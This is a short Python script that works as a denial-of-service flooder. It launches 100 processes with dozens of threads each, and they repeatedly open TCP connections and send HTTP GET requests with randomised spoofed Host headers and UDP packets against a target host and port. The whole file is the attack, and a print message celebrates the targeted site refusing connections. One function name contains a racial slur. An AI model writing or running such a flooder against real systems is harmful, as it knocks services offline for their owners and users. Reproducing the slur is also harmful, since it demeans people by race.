import socket
import multiprocessing as mp
import threading
import random

host, port = '127.0.0.1', 80
on = True


def tcp_flood(host, port):
    fake_ip = ".".join([str(random.randint(10, 250)) for x in range(4)])
    while on:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((host, port))
                s.send(f"""GET / HTTP/1.1\r\nHost: {fake_ip}\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.6167.85\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nSec-Fetch-Site: none\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\nSec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"\r\nSec-Ch-Ua-Mobile: ?0\r\nSec-Ch-Ua-Platform: "ChromeOS"\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\r\nPriority: u=0, i\r\nConnection: Keep-Alive\r\n\r\n""".encode())
            except ConnectionRefusedError as er:
                print(f"Connection Refused by site(Works)")
        except Exception as er:
            print(er)
        finally:
            s.close()
    print("End")

def udp_flood(host, port):
    fake_ip = ".".join([str(random.randint(10, 250)) for x in range(4)])
    while on:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(f"""GET / HTTP/1.1\r\nHost: {fake_ip}\r\nConnection: Keep-Alive\r\n\r\n""".encode(), (host, port))
        s.close()

def orig_nigg_proc(th = 1, th1=1):
        for i in range(th):
            threading.Thread(target=udp_flood, args=(host, port)).start()
        for i in range(th1):
            threading.Thread(target=tcp_flood, args=(host, port)).start()
        return

if __name__ =="__main__":
    
    try:
        for x in range(100):
            mp.Process(target=orig_nigg_proc, args=(0,30)).start()
    except KeyboardInterrupt:
        on = False
        exit()